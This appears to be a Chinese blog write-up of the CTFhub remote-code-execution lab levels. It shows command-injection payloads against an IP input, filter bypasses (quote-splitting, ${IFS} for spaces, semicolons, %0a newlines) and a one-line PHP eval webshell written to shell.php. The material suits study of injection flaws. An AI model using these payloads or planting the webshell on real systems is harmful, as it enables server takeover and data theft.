---
title: CTFhub RCE系列
date: 2020-03-18 16:35:21
tags:
    - rce
categories:
    - web
keywords: 
    - CTFhub RCE
toc: true
---



>今天介绍远程执行漏洞（其实想学反弹shell。
>
>首先需要掌握几种常见的语句。

　1、| ，& ，&&，||等操作　　　　

    　　 （1）& 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 & CMD2
    
    　　 （2）&& 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 && CMD2
    
    　　 （3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2

　　2、payload（& / ‘ “ 空格等特殊符号需要时编码）

    　　　(1) cmd = 127.0.0.1 | whoami
    
    　　　(2) cmd = 127.0.0.1 & whoami
    
    　　　(3) cmd = 127.0.0.1 && whoami
    
    　　　(4) cmd = `whoami`
    
    　　　(5) cmd = '/"|whoami（这里意思是用'/"引号闭合前面 /->表示或）

　　3、常用的命令

    　　 （1） 有回显的：whoami id（验证类）
    
    　　　(2) 没有回显的：nslookup wget 等看请求、dnslog httplog等 （验证类）
    
    　　 （3）弹shell必须的，参考我自己的（http://www.cnblogs.com/KevinGeorge/p/8120226.html） 
————————————————
版权声明：本文为CSDN博主「iamsongyu」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/iamsongyu/article/details/84483638

## 第一关
没有任何过滤
127.0.0.1|ls
127.0.0.1|cat ```.php
F12看源码。
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/OM37TH7SIQCK73E2G@8-1024x549.png)

---------
## 第二关 过滤掉了cat
还是先看
127.0.0.1|ls
127.0.0.1|c'a't flag_110451125822562.php
F12出flag
上述是一种方法
还有一种可以传一句话木马
```
127.0.0.1|echo "<?php @eval(\$_POST['a']);?>" >> shell.php
```
连shell就不展示了![](http://www.zhaobairen.club/wp-content/uploads/2020/03/TW97C_BNTT6OS5SIP6KR5T-1024x549.png)

----------
## 第三关 过滤空格
127.0.0.1|ls
我这里是运用了${IFS}来绕过了空格，我尝试了括号和url编码无果，
考虑使用了${IFS}
```
127.0.0.1|cat${IFS}flag_518528200601.php
```
依然F12看源码得到flag![](http://www.zhaobairen.club/wp-content/uploads/2020/03/8WDTY2X9QEABJHN12RC-1024x549.png)

------
## 第四关	过滤目录分隔符
目录分割符通常是'\'或者是'/'
两者在python中都可用。
那么就用分号类似堆叠注入一样每个语句后加分号
127.0.0.1;ls![](http://www.zhaobairen.club/wp-content/uploads/2020/03/N75J42DC_7H0GR1CV@W-1024x549.png)
```
127.0.0.1;cd flag_is_here;ls
```
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/PVJ6G54_V@CHJWI3C1IJ68-1024x549.png)
老套路
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/TXGPO8AN7WQTY@YQD6S-1024x549.png)
## 第五关 过滤运算符
同上关就可。这让我想到了是不是上一关有其他方法。
我去搜索了下。
得到结果其他人也是这么做的。
去搜索了有没有分号过滤以及绕过
没有得到什么结果（以后填坑）
第六关就填坑了。
## 第六关 以上所有关全部过滤
难道不是第二关+第三关+第四关就结束了？
好吧，看到题确实不是hhh。
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/SMGMUY4I11MUFXPC-1024x549.png)
毕竟是最后一个了，给大家分析一下吧
首先过滤了基本上面我所用过的所有命令分隔符。
那么在这里介绍一下另外两种分隔符
%0a(换行符) 、%0d(回车符)，并且在url下写入
```
?ip=127.0.0.1%0Als#
```
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/Y3JV8J5TMPO3OIXS9QX-1024x549.png)
注意只能在url写，否则会被二次编码导致失效。
那么就继续下一步。
```
ip=127.0.0.1%0acd${IFS}'f'lag_is_here%0als#
```
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/F@Q@XEUE_YE2TW7G5A6-956x1024.png)
最后一把梭
```
ip=127.0.0.1%0acd${IFS}'f'lag_is_here%0a'c'at${IFS}'f'lag_256432033625740.php#
```
![](http://www.zhaobairen.club/wp-content/uploads/2020/03/8EF1MBAB5TVTARMJ_XE-954x1024.png)
到此就结束一段了23333

--------------